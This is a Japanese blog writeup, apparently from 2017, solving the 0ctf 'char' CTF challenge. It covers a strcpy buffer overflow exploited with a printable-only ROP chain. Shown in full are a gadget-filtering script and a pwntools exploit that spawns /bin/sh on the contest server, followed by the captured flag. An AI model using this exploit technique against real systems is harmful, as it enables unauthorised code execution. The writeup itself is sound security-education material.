@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="ROP力足らなさ過ぎて本番中に解けなかった問題…関数0x08048678内のstrcpyでBuffer Overflow攻撃が可能さらに、NX bitが立っていたのでROPなのは明らかここまでなら問題ないが、printableな入力（正確には0x20から0x7eの範囲）しか受け付けないという制約を設けているのが問題となるとりあえず、rp++を使ってROPガジェットを吐き出して1$ rp++ -f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0ctf char writeup">
+<meta property="og:url" content="http://yoursite.com/2017/03/20/0ctf-char/index.html">
+<meta property="og:site_name" content="vegman429's notes">
+<meta property="og:description" content="ROP力足らなさ過ぎて本番中に解けなかった問題…関数0x08048678内のstrcpyでBuffer Overflow攻撃が可能さらに、NX bitが立っていたのでROPなのは明らかここまでなら問題ないが、printableな入力（正確には0x20から0x7eの範囲）しか受け付けないという制約を設けているのが問題となるとりあえず、rp++を使ってROPガジェットを吐き出して1$ rp++ -f">
+<meta property="og:updated_time" content="2017-03-20T12:50:11.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0ctf char writeup">
+<meta name="twitter:description" content="ROP力足らなさ過ぎて本番中に解けなかった問題…関数0x08048678内のstrcpyでBuffer Overflow攻撃が可能さらに、NX bitが立っていたのでROPなのは明らかここまでなら問題ないが、printableな入力（正確には0x20から0x7eの範囲）しか受け付けないという制約を設けているのが問題となるとりあえず、rp++を使ってROPガジェットを吐き出して1$ rp++ -f">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>0ctf char writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2017/03/20/hello-world/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/03/20/0ctf-char/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/03/20/0ctf-char/&text=0ctf char writeup"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/03/20/0ctf-char/&title=0ctf char writeup"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/03/20/0ctf-char/&is_video=false&description=0ctf char writeup"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0ctf char writeup&body=Check out this article: http://yoursite.com/2017/03/20/0ctf-char/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/03/20/0ctf-char/&title=0ctf char writeup"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/03/20/0ctf-char/&title=0ctf char writeup"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/03/20/0ctf-char/&title=0ctf char writeup"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/03/20/0ctf-char/&title=0ctf char writeup"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/03/20/0ctf-char/&name=0ctf char writeup&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        0ctf char writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">vegman429's notes</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-03-20T12:14:25.000Z" itemprop="datePublished">2017-03-20</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>ROP力足らなさ過ぎて本番中に解けなかった問題…<br>関数<code>0x08048678</code>内の<code>strcpy</code>でBuffer Overflow攻撃が可能<br>さらに、NX bitが立っていたのでROPなのは明らか<br>ここまでなら問題ないが、printableな入力（正確には0x20から0x7eの範囲）しか受け付けないという制約を設けているのが問題となる<br>とりあえず、rp++を使ってROPガジェットを吐き出して<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ rp++ -f ./libc.so -r 5 --unique &gt; gadgets</div></pre></td></tr></table></figure></p>
+<p>入力可能なアドレスのものをフィルタする<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># filter.py</span></div><div class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</div><div class="line"> </div><div class="line">gadgets = open(<span class="string">'./gadgets'</span>)</div><div class="line">libc_base = <span class="number">0x5555e000</span></div><div class="line"> </div><div class="line"><span class="keyword">for</span> ln <span class="keyword">in</span> gadgets.readlines():</div><div class="line">  ln = ln.rstrip(<span class="string">'\n'</span>)</div><div class="line"> </div><div class="line">  addrs = findall(<span class="string">r'0x([0-9a-f]&#123;8&#125;).*:'</span>, ln)</div><div class="line">  <span class="keyword">if</span> <span class="keyword">not</span> addrs:</div><div class="line">    <span class="keyword">continue</span></div><div class="line">  addr = libc_base + int(addrs[<span class="number">0</span>], <span class="number">16</span>)</div><div class="line"> </div><div class="line">  <span class="keyword">if</span> all((<span class="number">0x1f</span> &lt; ord(c) &lt;= <span class="number">0x7e</span>) <span class="keyword">and</span> (ord(c) != <span class="number">0x40</span>) <span class="keyword">for</span> c <span class="keyword">in</span> pack(<span class="string">'&lt;I'</span>, addr)):</div><div class="line">    <span class="keyword">print</span> hex(addr), ln</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python ./filter.py &gt; callable_gadgets</div></pre></td></tr></table></figure>
+<p>ここからは、以下の様にレジスタをセットして<code>execve</code>システムコールを呼び出すことを目標にして、ガジェットをひたすら探す。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">eax = 0xb</div><div class="line">ebx = &amp;&quot;bin/sh&quot;</div><div class="line">ecx = 0</div><div class="line">edx = 0</div></pre></td></tr></table></figure></p>
+<p>思いのほかxor系のガジェットがなくて苦労したが、<a href="http://hama.hatenadiary.jp/entry/2017/03/20/105208" target="_blank" rel="external">ここ</a>を参考にして（パクって）なんとかROPチェーンを組んだ。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</div><div class="line"> </div><div class="line"><span class="keyword">if</span> len(argv) == <span class="number">2</span> <span class="keyword">and</span> argv[<span class="number">1</span>] == <span class="string">'r'</span>:</div><div class="line">    proc = remote(<span class="string">'202.120.7.214'</span>, <span class="number">23222</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    proc = process(<span class="string">'./char'</span>)</div><div class="line"> </div><div class="line">add_bh_ah    = <span class="number">0x55634e43</span> <span class="comment"># add bh, ah ; ret  ;  (1 found)</span></div><div class="line">add_bl_al    = <span class="number">0x555f643f</span> <span class="comment"># add bl, al ; xor eax, eax ; ret  ;  (1 found)</span></div><div class="line">sar_edx      = <span class="number">0x55687e3f</span> <span class="comment"># sar edx, 0x1F ; add esp, 0x18 ; pop esi ; ret  ;  (1 found)</span></div><div class="line">and_edx      = <span class="number">0x55663073</span> <span class="comment"># and edx, 0x000000FF ; cmp ecx, 0x80000000 ; cmovne eax, edx ; ret  ;  (1 found)</span></div><div class="line">xor_eax_eax  = <span class="number">0x55636a4d</span> <span class="comment"># xor eax, eax ; ret  ;  (1 found)</span></div><div class="line">pop_eax      = <span class="number">0x555d7075</span> <span class="comment"># pop eax ; add al, 0x00 ; add al, ch ; retn 0xFFFC ;  (1 found)</span></div><div class="line">pop_ebx      = <span class="number">0x556a372f</span> <span class="comment"># pop ebx ; ret  ;  (1 found)</span></div><div class="line">pop_eax_ebx_esi_edi_ebp = <span class="number">0x5557506b</span> <span class="comment"># pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)</span></div><div class="line">pop_ecx      = <span class="number">0x556d2a51</span> <span class="comment"># pop ecx ; add al, 0x0A ; ret  ;  (1 found)</span></div><div class="line">and_ecx      = <span class="number">0x5566306d</span> <span class="comment"># and ecx, 0xC0000000 ; and edx, 0x000000FF ; cmp ecx, 0x80000000 ; cmovne eax, edx ; ret  ;  (1 found)</span></div><div class="line">inc_eax      = <span class="number">0x55644263</span> <span class="comment"># inc eax ; ret  ;  (1 found)</span></div><div class="line">int_0x80     = <span class="number">0x55667177</span> <span class="comment"># int 0x80 ;  (1 found)</span></div><div class="line"> </div><div class="line">payload = <span class="string">'A'</span> * <span class="number">32</span></div><div class="line"> </div><div class="line"><span class="comment"># edx = 0</span></div><div class="line">payload += p32(and_edx)</div><div class="line">payload += p32(sar_edx)</div><div class="line">payload += <span class="string">'AAAA'</span> * <span class="number">7</span></div><div class="line"> </div><div class="line"><span class="comment"># ecx = 0</span></div><div class="line">payload += p32(pop_ecx)</div><div class="line">payload += p32(<span class="number">0x3f555555</span>)</div><div class="line">payload += p32(and_ecx)</div><div class="line"> </div><div class="line"><span class="comment"># ebx = "/bin/sh"</span></div><div class="line">payload += p32(pop_eax_ebx_esi_edi_ebp)</div><div class="line">payload += p32(<span class="number">0x5050507c</span>)</div><div class="line">payload += p32(<span class="number">0x556b6770</span>)</div><div class="line">payload += <span class="string">'AAAA'</span> * <span class="number">3</span></div><div class="line">payload += p32(add_bh_ah)</div><div class="line">payload += p32(add_bl_al)</div><div class="line"> </div><div class="line"><span class="comment"># eax = 0xb</span></div><div class="line">payload += p32(xor_eax_eax)</div><div class="line">payload += p32(inc_eax) * <span class="number">0xb</span></div><div class="line"> </div><div class="line"><span class="comment"># int 0x80</span></div><div class="line">payload += p32(int_0x80)</div><div class="line"> </div><div class="line"><span class="keyword">with</span> open(<span class="string">'pld.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">    f.write(payload)</div><div class="line"> </div><div class="line">proc.sendline(payload)</div><div class="line">proc.interactive()</div><div class="line"> </div><div class="line"><span class="comment"># $ cd /home/char</span></div><div class="line"><span class="comment"># $ cat flag</span></div><div class="line"><span class="comment"># flag&#123;Asc11_ea3y_d0_1t???&#125;</span></div></pre></td></tr></table></figure></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/03/20/0ctf-char/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/03/20/0ctf-char/&text=0ctf char writeup"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/03/20/0ctf-char/&title=0ctf char writeup"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/03/20/0ctf-char/&is_video=false&description=0ctf char writeup"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0ctf char writeup&body=Check out this article: http://yoursite.com/2017/03/20/0ctf-char/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/03/20/0ctf-char/&title=0ctf char writeup"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/03/20/0ctf-char/&title=0ctf char writeup"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/03/20/0ctf-char/&title=0ctf char writeup"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/03/20/0ctf-char/&title=0ctf char writeup"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/03/20/0ctf-char/&name=0ctf char writeup&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2017 vegman429
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
